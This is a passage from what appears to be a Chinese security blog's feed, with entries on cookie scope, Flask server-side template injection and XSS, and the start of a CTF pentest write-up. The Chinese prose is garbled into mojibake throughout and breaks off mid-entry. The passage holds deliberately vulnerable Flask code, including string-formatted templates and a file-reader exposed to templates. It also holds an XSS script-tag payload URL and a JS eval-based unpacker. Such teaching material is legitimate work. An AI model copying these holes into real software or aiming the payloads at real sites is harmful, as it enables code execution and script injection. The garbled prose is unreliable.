æ³•å‘é€</li></ol></blockquote><p>è™½ç„¶è¿™äº›é™åˆ¶å¾ˆæœ‰å¿…è¦,ä½†æ˜¯æœ‰æ—¶å¾ˆä¸æ–¹ä¾¿ã€‚ä¾‹å¦‚æˆ‘åŒä¸€ä¸ªç½‘ç«™çš„ä¸åŒåŸŸåä¹‹é—´ä¸èƒ½å…±äº«cookie,å†ä¾‹å¦‚æˆ‘å‰ç«¯é¡µé¢é¡¹ç›®çš„åŸŸåä¸æˆ‘åç«¯æœåŠ¡çš„åŸŸåä¸åŒ,å°±ä¸èƒ½å‘é€ajaxè¯·æ±‚æ¥è®¿é—® åç«¯çš„æœåŠ¡etc... å¦‚æœè¦é¿å…çš„è¯å¯ä»¥ä½¿ç”¨jsonpå’Œcorsä¸¤ç§æ–¹æ³•(åç»­è¡¥ä¸Š...é¡ºä¾¿å­¦ä¹ )</p><h3 id="cookieä½œç”¨åŸŸ">cookieä½œç”¨åŸŸ</h3><p>è¿™å°±è¦çœ‹cookieçš„ä¸¤ä¸ªå±æ€§äº†,ä¸€ä¸ªæ˜¯domain,ä¸€ä¸ªæ˜¯path,ç”¨æ¥æŒ‡ç¤ºcookieçš„ä½œç”¨åŸŸ domainå‘Šè¯‰æµè§ˆå™¨cookieçš„åŸŸåå½’å±,æœªæŒ‡å®šçš„æ—¶å€™å°±æ˜¯å½“å‰åŸŸå pathå‘Šè¯‰æµè§ˆå™¨cookieçš„è·¯å¾„å½’å±,æœªæŒ‡å®šå°±æ˜¯å½“å‰è·¯å¾„,æ¯”å¦‚é€šè¿‡è®¿é—®www.vinceruan.info/java/hotspot.htmlæ·»åŠ çš„Cookieçš„é»˜è®¤è·¯å¾„å°±æ˜¯/java/,é€šè¿‡blog.vinceruan.info/java/hotspot.htmlç”Ÿæˆçš„Cookieçš„è·¯å¾„ä¹Ÿæ˜¯/java/. cookieçš„æäº¤éœ€è¦æ»¡è¶³ä¸¤ç‚¹: 1.cookieä¸ºå½“å‰åŸŸåæˆ–è€…çˆ¶åŸŸåä¸‹çš„cookie 2.cookieä¸ºå½“å‰è·¯å¾„æˆ–è€…çˆ¶è·¯å¾„ä¸‹çš„cookie ä¸¾ä¸ªä¾‹å­:è¦è®¿é—®blog.example.comçš„æ—¶å€™</p><blockquote><ul><li>cookie1:[name=value,domain=.example.com,path=/] (å¯ä»¥æäº¤.example.comæ˜¯blog.example.comçš„çˆ¶åŸŸå,pathä¹Ÿä¸€è‡´)</li><li>cookie2:[name=value,domain=blog.example.com,path=/] (ä¸èƒ½æäº¤,åŸŸåä¸€è‡´,ä½†æ˜¯è·¯å¾„ä¸ä¸€è‡´)</li><li>cookie3:[name=value,domain=www.example.com,path=/] (ä¸èƒ½æäº¤,è™½ç„¶è·¯å¾„ä¸€è‡´ä½†åŸŸåä¸ä¸€è‡´)</li><li>cookie4:[name=value,domain=blog.example.com,path=/] (å¯ä»¥æäº¤,åŸŸåè·¯å¾„ä¸¥æ ¼ä¸€è‡´)</li></ul></blockquote><h4 id="å…³äºhttponly">å…³äºhttponly</h4><p>httponlyè¿™ä¸ªç‚¹ä¹‹å‰ä¸€ç›´æ²¡çœ‹,è¿‘æœŸè¡¥äº†ä¸€ä¸‹ å¤§æ¦‚å°±æ˜¯è¯´è¢«è®¾ç½®ä¸ºhttponlyçš„cookieä¸èƒ½é€šè¿‡document.cookieæ¥è¢«è·å– å› æ­¤å°±ä¸ä¼šè¢«é»‘å®¢ç”¨xssè½»æ˜“è·å–äº†.</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flaskä¸‹æ¨¡ç‰ˆæ³¨å…¥å­¦ä¹ </title>
      <link href="/2017/11/01/flask%E4%B8%8B%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/11/01/flask%E4%B8%8B%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>æ–‡ç« å‚è€ƒè‡ª<a href="http://www.freebuf.com/articles/web/88768.html">è¿™é‡Œ</a></strong> ä»¥å‰åªä¼šä¸€ç‚¹phpçš„æ¼æ´,è¿™é‡Œå­¦ä¹ ä¸€ä¸‹pythonå¼€å‘çš„ç½‘ç«™çš„æ¼æ´</p><h3 id="æœåŠ¡å™¨æ¨¡ç‰ˆæ³¨å…¥">æœåŠ¡å™¨æ¨¡ç‰ˆæ³¨å…¥</h3><p>ä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-template-injection&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_ssti</span>():</span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27;</span>%person[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"><span class="comment">##### Private function if the user has local files.###</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_file</span>(<span class="params">f_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line">app.jinja_env.<span class="built_in">globals</span>[<span class="string">&#x27;get_user_file&#x27;</span>] = get_user_file </span><br><span class="line"><span class="comment"># Allows for use in Jinja2 templates</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æœåŠ¡å™¨ä¼šåœ¨å…¶contextä¸­æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„ä»£ç æ¯”å¦‚ <img src="/images/2017/11/flask1.png" alt="blacsheep" /> è€Œä¸”åŠ ä¸Šåœ¨è¿™ä¸ªåº”ç”¨é‡Œé¢æœ‰è·å–æ–‡ä»¶ä¿¡æ¯çš„åŠŸèƒ½,æ‰€ä»¥è¿˜ä¼šå¯¼è‡´æ–‡ä»¶åŒ…å«çš„æ¼æ´,æ¯”å¦‚ <img src="/images/2017/11/flask2.png" alt="blacsheep" /> ç”šè‡³æ˜¯pyçš„æºä»£ç  <img src="/images/2017/11/flask3.png" alt="blacsheep" /> ç„¶åè¡¥çš„è¯ä¹Ÿç®€å•,è¿™é‡Œä¸»è¦è¿˜æ˜¯å¼€å‘è€…ä¸ªäººçš„é—®é¢˜,å¦‚æœæˆ‘ä»¬åˆ©ç”¨jinja2åœ¨æ¨¡ç‰ˆé‡Œé¢ç”¨<code>&#123;&#123;&#125;&#125;</code>æ¥åŒ…å«å˜é‡,å°±ä¸ä¼šå¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œäº† <img src="/images/2017/11/flask4.png" alt="blacsheep" /></p><h3 id="xss">xss</h3><p>è¿™é‡Œä¸å¾—ä¸è¯´æœ‰ä¸ªå¾ˆè¿·çš„äº‹æƒ…... flaskå¯¹å¾ˆå¤šæ–‡ä»¶æä¾›äº†è‡ªåŠ¨è½¬ä¹‰çš„ç‰¹æ€§,ä½†æ˜¯è¿™é‡Œè¿˜æ˜¯å¾—è¯´</p><blockquote><p>1.æ¨¡ç‰ˆå¯ä»¥å…³é—­è‡ªåŠ¨è½¬ä¹‰çš„ç‰¹æ€§ 2.æ¨¡ç‰ˆå­—ç¬¦ä¸²éå…¬å…±æ–‡ä»¶æ‰©å±•å(.html,.htmä¸€ç±»)çš„æ—¶å€™ä¸å¯ç”¨è‡ªåŠ¨è½¬ä¹‰åŠŸèƒ½</p></blockquote><p>æ‰€ä»¥æŒ‰é“ç†æ¥è¯´,payloadä¸º http://127.0.0.1:5000/hello-template-injection?name=123.%3Cscript%3Ealert(/xss/)%3C/script%3E çš„æ—¶å€™åº”è¯¥æ˜¯ä¼šxssçš„,ä½†æ˜¯å´å¹¶æ²¡æœ‰,æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ,å¤§æ¦‚æ˜¯ç„å­¦å§,åæœŸè¦æ˜¯æ‡‚äº†ä¼šå›æ¥æ”¹çš„...é™„å›¾ <img src="/images/2017/11/flask5.png" alt="blacsheep" /></p><h3 id="é™æ€æ¨¡ç‰ˆxss">é™æ€æ¨¡ç‰ˆxss</h3><p>æœ‰çš„åº”ç”¨ä½¿ç”¨çš„æ˜¯é™æ€çš„æ¨¡ç‰ˆ,åˆ©ç”¨render_templateè¿”å›,è€Œrender_templateå¹¶ä¸æ˜¯ä¸€ä¸ªä¼šè‡ªåŠ¨è½¬ä¹‰çš„æ‰©å±•,æ‰€ä»¥å¦‚æœæˆ‘ä»¬hello.unsafeé‡Œé¢æ²¡æœ‰åŠ è½¬ä¹‰çš„è¯,è¿˜æ˜¯ä¼šå¯¼è‡´xssçš„,æ¯”å¦‚æˆ‘ä»¬åœ¨flaskrun.pyä¸‹é¢å»ºä¸€ä¸ªtemplatesæ–‡ä»¶å¤¹,é‡Œé¢æ”¾ä¸€ä¸ªæ¨¡ç‰ˆåå­—å«hello.unsafe(å°±ç”¨åˆ«äººçš„åå­—äº†,æˆ‘æ‡’å¾—æƒ³),ç„¶åé‡Œé¢å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% autoescape true %&#125; </span><br><span class="line">&lt;h2&gt;Good&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    Hello &#123;&#123; name &#125;&#125;! I don<span class="string">&#x27;t trust your input. I escaped it, just in case.</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&#123;% endautoescape %&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;h2&gt;Bad&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;</span></span><br><span class="line"><span class="string">    I trust all data! How are you &#123;&#123; name &#125;&#125;? </span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br></pre></td></tr></table></figure><p>é¡ºä¾¿æ”¹ä¸€ä¸‹pythonçš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-template-injection&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_ssti</span>():</span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h2&gt;Hello &#123;&#123;person.name&#125;&#125;!&lt;/h2&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"><span class="comment">##### Private function if the user has local files.###</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-xss&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_xss</span>():</span><br><span class="line">    name = <span class="string">&quot;world&quot;</span></span><br><span class="line">    template = <span class="string">&#x27;hello.unsafe&#x27;</span> <span class="comment"># &#x27;unsafe&#x27; file extension... totally legit.</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(template, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_file</span>(<span class="params">f_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment">#app.jinja_env.globals[&#x27;get_user_file&#x27;] = get_user_file # Allows for use in Jinja2 templates</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>xssçš„å›¾ <img src="/images/2017/11/flask6.png" alt="blacsheep" /> æ‰€ä»¥æˆ‘ä»¬åº”è¯¥å¼€å¯è‡ªåŠ¨è½¬ä¹‰ åœ¨badéƒ¨åˆ†é‡Œé¢æŠŠæ”¹æˆ <img src="/images/2017/11/flask7.png" alt="blacsheep" /></p><h3 id="flaskå±æ€§xss">flaskå±æ€§xss</h3><p>é¦–å…ˆä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-template-injection&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_ssti</span>():</span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h2&gt;Hello &#123;&#123;person.name&#125;&#125;!&lt;/h2&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"><span class="comment">##### Private function if the user has local files.###</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-xss&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_xss</span>():</span><br><span class="line">    name = <span class="string">&quot;world&quot;</span></span><br><span class="line">    template = <span class="string">&#x27;hello.unsafe&#x27;</span> <span class="comment"># &#x27;unsafe&#x27; file extension... totally legit.</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(template, name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello-hi&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_hi</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&lt;title&gt;No Injection Allowed!&lt;/title&gt; </span></span><br><span class="line"><span class="string">        &lt;a href=&#x27;&#123;&#123; url_for(&#x27;hello_xss&#x27;)&#125;&#125;?name=&#123;&#123; name e&#125;&#125;&#x27;&gt; </span></span><br><span class="line"><span class="string">        Click here for a welcome message&lt;/a&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&quot;world&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_file</span>(<span class="params">f_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment">#app.jinja_env.globals[&#x27;get_user_file&#x27;] = get_user_file # Allows for use in Jinja2 templates</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è½¬ä¹‰å‡½æ•°å¯¹äºhtmlçš„å±æ€§æ²¡åµç”¨,é“¾æ¥ä½œä¸ºä¸€ä¸ªæ•´ä½“,å¦‚æœä¸åŠ å¼•å·å°è£…çš„è¯å°±ä¼šå¯¼è‡´ç”¨æˆ·ç”¨onmouseoverä¸€ç±»payloadè§¦å‘xss <img src="/images/2017/11/flask8.png" alt="blacsheep" /> åˆ©ç”¨å¼•å·å°è£…å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ <img src="/images/2017/11/flask9.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cnssæ‹›æ–°wp(pentest)</title>
      <link href="/2017/10/22/cnss%E6%8B%9B%E6%96%B0wppentest/"/>
      <url>/2017/10/22/cnss%E6%8B%9B%E6%96%B0wppentest/</url>
      
        <content type="html"><![CDATA[<p>å†™wpçš„æ™šä¸Šå¹³å°æŒ‚äº†,éšæ„çš„å†™ä¸€å†™</p><h3 id="å…¥é—¨">1.å…¥é—¨</h3><p><a href="http://game.mitah.cn/beginning/">ä¼ é€é—¨</a> tip:ç®€ç›´å°±æ˜¯åœ¨é€ å³é”®Â  æºç Â  å¤åˆ¶Â  ç²˜è´´Â  æäº¤</p><h3 id="are_you_european">2.Are_you_European</h3><p><a href="http://game.mitah.cn/Are_you_European/">ä¼ é€é—¨</a> æˆ‘æ˜¯è§£çš„jsæ··æ·†åšçš„,é¡µé¢ä¸‹é¢æœ‰æ··æ·†çš„js,ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬è§£æ··æ·†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">a = <span class="number">62</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    code = code.<span class="title function_">replace</span>(<span class="regexp">/[\r\n]+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    code = code.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&quot;\\&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> tmp = code.<span class="title function_">match</span>(<span class="regexp">/\b(\w+)\b/g</span>);</span><br><span class="line">    tmp.<span class="title function_">sort</span>();</span><br><span class="line">    <span class="keyword">var</span> dict = [];</span><br><span class="line">    <span class="keyword">var</span> i, t = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tmp.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp[i] != t) dict.<span class="title function_">push</span>(t = tmp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> len = dict.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">var</span> ch;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        ch = <span class="title function_">num</span>(i);</span><br><span class="line">        code = code.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span> + dict[i] + <span class="string">&#x27;\\b&#x27;</span>, <span class="string">&#x27;g&#x27;</span>), ch);</span><br><span class="line">        <span class="keyword">if</span> (ch == dict[i]) dict[i] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;eval(function(p,a,c,k,e,d)</span></span><br><span class="line"><span class="string">&#123;e=function(c)</span></span><br><span class="line"><span class="string">&#123;return(c&lt;a?&#x27;&#x27;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;</span></span><br><span class="line"><span class="string">if(!&#x27;&#x27;.replace(/^/,String))</span></span><br><span class="line"><span class="string">&#123;while(c--)d[e(c)]=k[c]e(c)</span></span><br><span class="line"><span class="string">;k=[function(e)&#123;return d[e]&#125;];</span></span><br><span class="line"><span class="string">e=function()&#123;return&#x27;\\\\w+&#x27;&#125;;c=1&#125;;</span></span><br><span class="line"><span class="string">while(c--)</span></span><br><span class="line"><span class="string">if(k[c])</span></span><br><span class="line"><span class="string">p=p.replace(new RegExp(&#x27;\\\\b&#x27;+e(c)+&#x27;\\\\b&#x27;,&#x27;g&#x27;),k[c]);</span></span><br><span class="line"><span class="string">return p</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">(&quot;</span> + <span class="string">&quot;&#x27;&quot;</span> + code + <span class="string">&quot;&#x27;,&quot;</span> + a + <span class="string">&quot;,&quot;</span> + len + <span class="string">&quot;,&#x27;&quot;</span> + dict.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;&#x27;.split(&#x27;&#x27;),0,&#123;&#125;))&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">num</span>(<span class="params">c</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> (c&lt;a?<span class="string">&#x27;&#x27;</span>:<span class="title function_">num</span>(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c+<span class="number">29</span>): c.<span class="title function_">toString</span>(<span class="number">36</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    code = code.<span class="title function_">replace</span>(<span class="regexp">/^eval/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span> = <span class="built_in">eval</span>(code);</span><br><span class="line">&#125; &lt; /script&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;textarea id=&quot;code&quot; cols=&quot;80&quot; rows=&quot;20&quot;&gt; </span><br><span class="line"></span><br><span class="line">&lt;/textarea &gt; </span><br><span class="line">&lt;input type = &quot;button&quot;value = &quot;Encode&quot; / &gt;</span><br><span class="line">&lt;input type = &quot;button&quot;value = &quot;Run&quot; / &gt;</span><br><span class="line">&lt;input type = &quot;button&quot;value = &quot;Decode&quot; / &gt;</span><br></pre></td></tr></table></figure><p>æŠŠå‰é¢è¿™æ®µä¿å­˜æˆhtmlæ–‡ä»¶,æœ¬åœ°æ‰“å¼€æŠŠæ··æ·†æ‰”è¿›å»decodeä¸€ä¸‹ç„¶åå»<a href="http://tool.oschina.net/codeformat/js">æ ¼å¼åŒ–ä¸€ä¸‹</a>ç„¶åçœ‹ä¸€ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">soHappy</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buy = <span class="title function_">confirm</span>(<span class="string">&quot;SSRï¼æ¬§æ´²äººï¼Œä½ 